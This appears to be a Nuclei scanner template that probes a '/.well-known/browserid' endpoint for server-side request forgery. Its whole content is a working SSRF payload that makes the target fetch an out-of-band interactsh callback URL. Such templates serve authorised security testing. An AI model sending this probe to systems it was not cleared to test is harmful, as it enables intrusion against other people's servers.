http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  method: GET
  path:
  - '{{BaseURL}}/.well-known/browserid?domain=https://{{interactsh-url}}'
  stop-at-first-match: true
id: fxa-datastore-ssrf
info:
  author: reewardius
  name: SSRF
  reference:
  - https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/
  severity: high
  tags: ssrf,generic
